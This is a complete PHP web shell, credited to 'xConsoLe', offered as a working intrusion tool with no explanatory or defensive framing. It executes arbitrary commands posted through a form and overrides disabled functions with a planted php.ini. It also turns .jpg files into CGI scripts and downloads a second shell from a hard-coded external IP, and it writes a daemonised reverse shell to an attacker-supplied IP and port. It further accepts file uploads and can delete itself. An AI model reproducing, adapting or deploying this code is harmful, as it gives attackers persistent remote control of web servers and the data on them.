<?php
/*------- WebShell---------- */
/*------ Coded by xConsoLe -------- */
error_reporting(0);
function Execute($in) {
    $out = '';
    if (function_exists('system')) {
        @system($in,$out);
        $out = @join("\n",$out);
    } elseif (function_exists('passthru')) {
        ob_start();
        @passthru($in);
        $out = ob_get_clean();
    } elseif (function_exists('exec')) {
        ob_start();
        @exec($in);
        $out = ob_get_clean();
    } elseif (function_exists('shell_exec')) {
        $out = shell_exec($in);
    } elseif (is_resource($f = @popen($in,"r"))) {
        $out = "";
        while(!@feof($f))
            $out .= fread($f,1024);
        pclose($f);
    }
    return $out;
}
 
if(@ini_get("disable_functions")){
 echo "DisablePHP=".@ini_get("disable_functions");
}else{
 echo "Disable PHP = None";
 echo "<br>";echo " Kernel = ";echo Execute("uname -a");echo "<br>";
echo Execute("id");}echo "<br>";print "\n";
if(@ini_get("safe_mode")){echo "Safe Mode = ON";}else{ echo "Safe Mode = OFF";}
echo "<br>";print "\n";
echo " Curl Support = ";echo Execute("which curl"); echo "<br>";print "\n";
echo getcwd();
echo "<br><br>[ <a href='?konek' >./BEKKONEK</a> ] | [ <a href='?disc' >./DIS FUNC</a> ] |
[ <a href='?command' >./EXEC</a> ] | [ <a href='?cgishell' >./CGI SHELL</a> ] |
[ <a href='?upp' >./UPLOAD</a> ] | [ <a href='?hapus' >./KILL ME</a> ]<br><br>";
 
if(isset($_GET["cgishell"])){
$path = getcwd();
$file = '
Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .jpg
AddHandler cgi-script .jpg
AddHandler cgi-script .jpg
';
mkdir("cgi", 0755);
$b = fopen($path.'/cgi/.htaccess', 'w');
fwrite($b,$file);
fclose($b);
$file = file_get_contents('http://64.34.111.182/cgi.txt');
$b = fopen($path.'/cgi/ganteng.jpg', 'w');
fwrite($b,$file);
fclose($b);
chmod($path.'/cgi/ganteng.jpg', 0755);
echo"<br><a href='cgi/ganteng.jpg' target='_blank'>SHELL</a><br>";
echo"Password = d3b";
}
 
if(isset($_GET["disc"])){
$path = getcwd();
$content = '
safe_mode = off
disable_functions = NONE
';
$fff = fopen($path.'/php.ini', 'w'); fwrite($fff, $content); fclose($fff);
echo"<a href='php.ini' target='_blank'>[ DisFunct]</a><br></center>";
}
if(isset($_GET["upp"])){
echo"<form method=post enctype=multipart/form-data>";
echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";
if($_POST["v"]==up){if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){
echo"<b>berhasil</b>-->".$_FILES["f"]["name"];
}else{
echo"<b>gagal";}}
}
if(isset($_GET["hapus"])){
if(file_exists("kon.php")) unlink("kon.php");
unlink(__FILE__);
echo "Bye";
}
if(isset($_GET["konek"])){
echo <<<PEE
<form method='POST'>
<input size='20' value='162.243.77.30' name='ip' type='text'> : IP<br>
<input size='20' value='443' name='port' type='text'> : PORT
<br>
<input value='konek' name='' type='submit'><br><br>
</form>
PEE;
if($_POST){
$ipx = $_POST['ip'];
$portx = $_POST['port'];
$path = getcwd();
$lol = '<?php set_time_limit (0); $ip = "'.$ipx.'"; $port = '.$portx.'; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = "uname -a; w; id; /bin/sh -i"; $daemon = 0; $debug = 0; if (function_exists("pcntl_fork")) { $pid = pcntl_fork(); if ($pid == -1) { printit("ERROR: Cant fork"); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit("Error: Cant setsid()"); exit(1); } $daemon = 1; } else { printit("WARNING: Failed to daemonise. This is quite common and not fatal."); } chdir("'.$path.'/"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit("$errstr ($errno)"); exit(1); } $descriptorspec = array( 0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w") ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit("ERROR: Cant spawn shell"); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit("Successfully opened reverse shell to $ip:$port"); while (1) { if (feof($sock)) { printit("ERROR: Shell connection terminated"); break; } if (feof($pipes[1])) { printit("ERROR: Shell process terminated"); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit("SOCK READ"); $input = fread($sock, $chunk_size); if ($debug) printit("SOCK: $input"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit("STDOUT READ"); $input = fread($pipes[1], $chunk_size); if ($debug) printit("STDOUT: $input"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit("STDERR READ"); $input = fread($pipes[2], $chunk_size); if ($debug) printit("STDERR: $input"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print "$string\n"; } } ?>';
$fff = fopen($path.'/kon.php', 'w'); fwrite($fff, $lol); fclose($fff);
echo "[ <a href='kon.php' target='_blank'>./GO</a> ]";
}
}
if(isset($_GET["command"])){
echo <<<PEE
  <form method='POST'>
  <input size='100' value='' name='comma' type='text'><br>
  <input value=' Exec Command ' name='' type='submit'><br><br>
  </form>
PEE;
if($_POST){
 $comm = $_POST['comma'];
 echo '<textarea rows="20" cols="100">';
 echo nl2br(Execute($comm));
 echo '</textarea>';
}
}
?>
